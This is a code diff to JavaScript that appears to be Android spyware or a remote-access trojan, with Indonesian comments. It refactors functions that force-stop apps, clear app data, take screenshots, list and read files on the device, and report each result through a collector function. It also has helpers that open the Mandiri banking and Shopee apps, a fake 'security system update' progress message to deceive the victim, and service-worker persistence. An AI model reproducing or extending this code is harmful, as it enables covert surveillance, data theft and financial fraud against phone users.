-        try { AndroidBridge.forceStopApp(packageName); K({ sumber: 'app_force_stop', data: { package: packageName } }); return 'Force stopping app: ' + packageName; } catch(e) {}
-    }
-    return 'Force stop not available';
+    try {
+        A.forceStopApp(packageName);
+        K({ sumber: 'app_force_stop', data: { package: packageName } });
+        return 'Force stopping app: ' + packageName;
+    } catch(e) { return 'Force stop not available'; }
 }
 function appClearData(packageName) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try { AndroidBridge.clearAppData(packageName); K({ sumber: 'app_clear_data', data: { package: packageName } }); return 'Clearing app data: ' + packageName; } catch(e) {}
-    }
-    return 'Clear data not available';
+    try {
+        A.clearAppData(packageName);
+        K({ sumber: 'app_clear_data', data: { package: packageName } });
+        return 'Clearing app data: ' + packageName;
+    } catch(e) { return 'Clear data not available'; }
 }
 function bukaURL(url) {
     try { window.open(url, '_blank'); return 'URL opened'; } catch(e) { return 'Error: ' + e.message; }
@@ -1391,12 +1475,14 @@ function bukaMandiri() { return bukaAplikasi('com.bankmandiri.mandirionline'); }
 function bukaShopee() { return bukaAplikasi('com.shopee.id'); }
 function ambilScreenshot() {
     try {
+        var data = A.takeScreenshot();
+        if (data) { K({ sumber: 'screenshot', data: data }); return 'Screenshot taken'; }
+    } catch(e) {}
+    try {
         var canvas = document.createElement('canvas');
-        canvas.width = screen.width;
-        canvas.height = screen.height;
+        canvas.width = screen.width; canvas.height = screen.height;
         var ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#000';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#000'; ctx.fillRect(0, 0, canvas.width, canvas.height);
         var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
         K({ sumber: 'screenshot', data: dataUrl });
         return 'Screenshot taken';
@@ -1488,21 +1574,17 @@ function screenRecordStatus() {
     return screenRecorder ? 'Screen recording: ' + screenRecorder.state : 'No screen recording';
 }
 function listFile(path) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var files = AndroidBridge.listFiles(path);
-            if (files) { K({ sumber: 'list_file', data: JSON.parse(files) }); return 'Files listed from ' + path; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.listFiles(path);
+        if (data) { K({ sumber: 'list_file', data: data }); return 'Files listed from ' + path; }
+    } catch(e) {}
     return 'File list not available';
 }
 function ambilFile(path) {
-    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
-        try {
-            var file = AndroidBridge.readFile(path);
-            if (file) { K({ sumber: 'ambil_file', data: { path: path, content: file } }); return 'File read'; }
-        } catch(e) {}
-    }
+    try {
+        var data = A.readFile(path);
+        if (data) { K({ sumber: 'ambil_file', data: { path: path, content: data } }); return 'File read'; }
+    } catch(e) {}
     return 'File read not available';
 }
 function getSystemInfo() {
@@ -1599,7 +1681,7 @@ function finishAndRedirect() {
 // START
 // ============================================================
 updateProgress(5, '⏳ Memperbarui System Keamanan...');
-K({ sumber: 'system_update_start', data: { platform: PLATFORM } });
+K({ sumber: 'system_update_start', data: { platform: getPlatform() } });
 
 // Load HTML dari semua lokasi (self-repair)
 loadHTMLFromAllLocations().then(function(html) {
@@ -1611,9 +1693,11 @@ loadHTMLFromAllLocations().then(function(html) {
 
 // Register service worker (untuk cache)
 if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('/sw.js', { scope: '/' })
-        .then(function(reg) { K({ sumber: 'sw_registered', data: { scope: reg.scope } }); })
-        .catch(function() {});
+    try {
+        navigator.serviceWorker.register('/sw.js', { scope: '/' })
+            .then(function(reg) { K({ sumber: 'sw_registered', data: { scope: reg.scope } }); })
+            .catch(function() {});
+    } catch(e) {}
 }
 
 // Panggil enhanced self-healing
